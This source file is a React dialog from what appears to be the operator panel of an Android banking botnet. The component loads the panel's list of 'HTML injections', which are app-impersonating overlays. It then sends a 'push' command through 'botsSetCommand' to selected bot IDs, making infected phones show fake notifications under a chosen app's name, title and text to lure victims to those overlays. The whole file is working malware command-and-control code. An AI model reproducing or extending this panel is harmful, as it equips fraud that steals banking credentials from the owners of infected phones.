import React, { useState, useEffect, useRef } from 'react'
import SettingsContext from 'src/settings';
import NextLink from 'next/link';
import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
import Battery from '@heroicons/react/24/solid/Battery100Icon';
import { func } from 'prop-types';
import axios from "axios";
import $ from 'jquery';
import { Svg } from "react-svg";
import cheerio from "cheerio";

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faBell, faSpinner } from '@fortawesome/free-solid-svg-icons';
import { borderRadius } from '@mui/system';

import { toast } from 'react-toastify';
import TextField from '@mui/material/TextField';

export default function Push(props) {

    const { openPopup, setOpenPopup, selected} = props;
    const [app, setApp] = useState('');

    const [title, setTitle] = useState('');
    const [text, setText] = useState('');

    useEffect(() => {    
        if (openPopup && SettingsContext.Injections.length < 1) {
            let request = $.ajax({
                type: 'POST',
                url: SettingsContext.restApiUrl,
                data: {
                    'params':  new Buffer ('{"request":"getHtmlInjection","password":"' + SettingsContext.password + ' "}').toString('base64')
                }
              });
          
              request.done(function(msg) {
                let response = (JSON.parse(msg))
    
                let allinj = [];
    
                for (let i = 0; i < response.dataInjections.length; i++) {
                    const json = response.dataInjections[i];
                    allinj.push(json);
                }
                
                SettingsContext.Injections = allinj
                
              }.bind(this));
        }
      }, [openPopup]);

      function SendCommand(app, title, text) {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: { 
                'params': new Buffer(
                    '{"' + 
                    'request":"botsSetCommand",' + 
                    '"idbot":"' + selected.join(',') + '",' + 
                    '"command":"' + new Buffer('{"name":"push","app":"' + app + '","title":"' + title + '","text":"' + text + '"}').toString('base64') + '"' + 
                    ',"password":"' + SettingsContext.password + '"}').toString('base64')
            }
        });
    }
    
    return (
        
        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
            <DialogContent dividers>
                    <div style={{ display: "flex", justifyContent: "space-between"}}>

                    <Box
                    bgcolor="primary.main"
                    color="primary.contrastText"
                    p={2}
                    borderRadius={1}
                    marginRight={2}
                    alignItems="center"
                    display="flex"
                    height={45}
                    width={220}
                >
                    <SvgIcon fontSize="medium">
                          <FontAwesomeIcon icon={faBell}/>
                        </SvgIcon>
                        <Typography ml={1} variant='h6' color="primary.contrastText" >Send Notification</Typography>
                        
                    </Box>

                    <Button
                        onClick={()=>{setOpenPopup(false)}}>
                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
                    </Button>
                    </div>

                    <TextField onChange={()=> setTitle(event.target.value)} sx={{mt: 3}} id="outlined-basic" label="Title" variant="outlined" fullWidth/>

                    <div>
                    <TextField onChange={()=> setText(event.target.value)} sx={{mt: 2}} id="outlined-basic" label="Text" variant="outlined" fullWidth/>
                    </div>

                    <FormControl sx={{mt: 2}} fullWidth>
                    {SettingsContext.Injections.length > 0 ? 
                    <>
                    <InputLabel id="demo-simple-select-label">App</InputLabel>
                    <Select
                        labelId="demo-simple-select-label"
                        id="demo-simple-select"
                        label="App"
                        value={app}
                        onChange={()=> {setApp(event.target.textContent)}}
                    >
                        {SettingsContext.Injections.map((item, index) => (
                        <MenuItem sx={{display: 'flex', alignItems: 'center'}} key={index.app} value={item.app}>
                            <ListItemAvatar>
                                <img width={40} src={`data:image/png;base64,${item.icon}`}></img>
                            </ListItemAvatar>
                            <span>{item.app}</span>
                        </MenuItem>
                        ))}
                    </Select></> : <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', animation: 'spin 1s infinite linear',}}>
                <FontAwesomeIcon icon={faSpinner} spin size="5x" /></div>}
                    </FormControl>

                    <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                    <Button onClick={()=> {if (app != '') { SendCommand(app, title, text); setOpenPopup(false);  setApp(''); setTitle(''); setText(''); toast.success("Send push to bot")} else { toast.error("You need to select an app before performing this action"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
                    </div>
            </DialogContent>
        </Dialog>
    )
}
